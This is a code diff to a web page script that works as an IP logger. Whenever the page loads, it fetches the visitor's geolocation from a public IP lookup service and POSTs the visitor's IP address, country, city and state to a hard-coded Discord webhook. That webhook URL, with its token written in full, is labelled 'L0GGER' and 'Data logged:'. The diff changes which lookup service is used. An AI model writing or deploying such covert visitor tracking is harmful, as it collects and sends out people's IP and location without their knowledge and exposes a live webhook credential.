@@ -14,8 +14,9 @@
     request.open("POST", "https://discord.com/api/webhooks/840728570434682880/5ccxJECuk7xjiN_a4GKrEbLGdtt2C1pfIns65ybWGRlMoeO8I5wHnnrjfqUNiFVHKGjh");
     request.setRequestHeader('Content-type', 'application/json');
 
-    $.getJSON('http://ip-api.com/json', function(data) {
+    $.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
       console.log(JSON.stringify(data, null, 2));
+    
       var DData = data
       var query = $("#query").val()
 
@@ -24,7 +25,7 @@
         name: "L0GGER"
       },
       title: "Data logged:",
-      description: "Country: " + DData.country + "\n\nCity: " + DData.city + "\n\nRegion Name: " + DData.regionName + "\n\nZip/postnummer: " + DData.zip + "\n\nIP: " + DData.query + "\n\nisp: " + DData.isp + "\n\nStatus: " + DData.status,
+      description: "Country: " + DData.countryName + "\n\nCity: " + DData.city + "\n\nContinent Name: " + DData.continentName + "\n\nState: " + DData.stateProv + "\n\nIP: " + DData.ipAddress + "\n\nCountry Code: " + DData.countryCode,
       color: hexToDecimal("#ff0000"),
     }
 
@@ -37,7 +38,7 @@
 
     function hexToDecimal(hex) {
       return parseInt(hex.replace("#",""), 0)
-    }
+    }  
 });
   </script>
 </html>
